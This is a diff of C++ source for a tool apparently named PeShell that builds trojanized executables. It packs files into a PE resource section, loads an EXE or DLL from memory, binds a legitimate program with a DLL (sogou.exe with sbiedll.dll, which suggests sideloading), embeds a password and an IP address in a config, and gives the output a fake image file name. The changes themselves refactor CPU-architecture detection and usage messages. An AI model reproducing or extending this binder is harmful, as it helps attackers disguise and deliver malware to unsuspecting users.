@@ -18,12 +18,16 @@
 #include "PEParser.h"
 #include "Resource.h"
 #include "crypto.h"
+#include "FileHelper.h"
+#include "main.h"
 
 #define CONFIG_FILENAME					"config.dat"
 
 #define TEMPLATE_TEMPORARY_FILENAME		"test.dat"
 
-#define _CONSOLE
+#define DEFAULT_TARGET_FILENAME			"out.exe"
+
+
 
 #ifdef _CONSOLE
 
@@ -37,17 +41,15 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	if (argc < 3)
 	{
-		printf("example:PeShell -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n");
+		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n",argv[0]);
 
-		printf("example:PeShell -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n");
+		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n", argv[0]);
 
-		printf("example:PeShell -ber sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
+		printf("example:%s -re sogou.exe -c params.dat -o out.exe\r\n", argv[0]);
 
-		printf("example:PeShell -re sogou.exe -c params.dat -o out.exe\r\n");
+		printf("example:%s -rd sogou.dll -c params.dat -o out.dll\r\n", argv[0]);
 
-		printf("example:PeShell -rd sogou.dll -c params.dat -o out.dll\r\n");
-
-		printf("param error\r\n");
+		printf("%s param error\r\n",argv[0]);
 		ret = getchar();
 		return -1;
 	}
@@ -67,75 +69,79 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	int bRename = FALSE;
 
-	int cpu_arch = PEParser::getPEArch((const char*)GetModuleHandleW(0));;
+	int cpu_arch = 0; 
 
 	string outpath = "";
 
-	for (int i = 1; i < argc; i++)
+	for (int seq = 1; seq < argc; seq++)
 	{
-		char* str = argv[i];
+		char* str = argv[seq];
 		if (lstrcmpiA(str, "-b") == 0 )
 		{
 			type = BIND_RELEASE_EXE;
+			cpu_arch = GetPeArch(argv[seq +1]);
 
-			for (int j = i + 1; j < i+3; j++)
+			for (int j = seq + 1; j < seq +3; j++)
 			{
 				lstrcpyA(filelist[paramscnt], argv[j]);
 				paramscnt++;
 			}
 
-			i += 2;
+			seq += 2;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-re") == 0)
 		{
-			printf("argv[%i]:%s\r\n", i, argv[i + 1]);
+			printf("argv[%i]:%s\r\n", seq, argv[seq + 1]);
+
+			cpu_arch = GetPeArch(argv[seq + 1]);
 
 			type = MEM_RUN_EXE;
-			lstrcpyA(filelist[paramscnt], argv[i + 1]);
+			lstrcpyA(filelist[paramscnt], argv[seq + 1]);
 			paramscnt++;
-			i += 1;
+			seq += 1;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-rd") == 0)
 		{
 			type = MEM_RUN_DLL;
-			lstrcpyA(filelist[paramscnt], argv[i + 1]);
+			cpu_arch = GetPeArch(argv[seq + 1]);
+			lstrcpyA(filelist[paramscnt], argv[seq + 1]);
 			paramscnt++;
-			i += 1;
+			seq += 1;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-o") == 0)
 		{
-			lstrcpyA(szoutFn, argv[i + 1]);
-			i += 1;
+			lstrcpyA(szoutFn, argv[seq + 1]);
+			seq += 1;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-f") == 0)
 		{
-			outpath = argv[i + 1];
-			i += 1;
+			outpath = argv[seq + 1];
+			seq += 1;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-c") == 0)
 		{
-			Public::prepareCfg(argv[i + 1], CONFIG_FILENAME);
+			Public::prepareCfg(argv[seq + 1], CONFIG_FILENAME);
 			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
 			paramscnt++;
 
-			i += 1;
+			seq += 1;
 			continue;
 		}
 		else if (lstrcmpiA(str, "-p") == 0)
 		{
 
-			if (i + 2 > argc) {
+			if (seq + 2 > argc) {
 				printf("argument error\r\n");
 				return -1;
 			}
-			Public::prepareParams(argv[i + 1], argv[i + 2],type, key,CONFIG_FILENAME);
+			Public::prepareParams(argv[seq + 1], argv[seq + 2],type, key,CONFIG_FILENAME);
 
-			i += 2;
+			seq += 2;
 
 			lstrcpyA(filelist[paramscnt], CONFIG_FILENAME);
 			paramscnt++;		
@@ -151,7 +157,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	if (szoutFn[0] == 0)
 	{
-		lstrcpyA(szoutFn, "OutTest.exe");
+		lstrcpyA(szoutFn, DEFAULT_TARGET_FILENAME);
 	}
 	if (type == 0)
 	{
@@ -159,16 +165,21 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		ret = getchar();
 		return -1;
 	}
-	if (cpu_arch == 0x014c)
-	{
 
+	printf("TYPE:%d,CPU:%d\r\n",type,cpu_arch);
+	if(cpu_arch!= 32 && cpu_arch !=64)
+	{
+		printf("cannot get cpu architecture of target file\r\n");
+		ret = getchar();
+		return -1;
 	}
+
 	char secname[] = { '.','r','c','d','a','t','a',0 };
 
 	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn,key);
 	if (resultfn == "")
 	{
-		printf("something error happened!\r\n");
+		printf("%s error\r\n",__FUNCTION__);
 		ret = getchar();
 		return -1;
 	}
@@ -182,7 +193,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 		FakeFilename::fakefn(resultfn, jpg, mystr);
 	}
 
-	printf("bind type:%d cpu arch:%x completed\r\n", type, cpu_arch);
+	printf("bind type:%d cpu arch:%d completed\r\n", type, cpu_arch);
 	ExitProcess(0);
 	return 0;
 }
@@ -194,7 +205,32 @@ int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmo
 #endif
 
 
+int GetPeArch(char * fn) {
+	int fs = 0;
+	char* data = 0;
+	int ret = 0;
+	ret = FileHelper::fileReader(fn, &data, &fs);
+	if (ret <= 0)
+	{
+		printf("fileReader file:%s error\r\n", fn);
+		return -1;
+	}
+	int cpu_arch = PEParser::getPEArch((const char*)data);
+	delete data;
+	if(cpu_arch == 0x14c)
+	{
+		return 32;
+	}
+	else if(cpu_arch == 0x8664)
+	{
+		return 64;
+	}
+	else {
 
+		return 0;
+	}
+	return 0;
+}
 
 //array[x][y]在内存中是随着内存地址递增的,array[x] array[x+1] 差是16，why?
 //*[]结构是指针数组
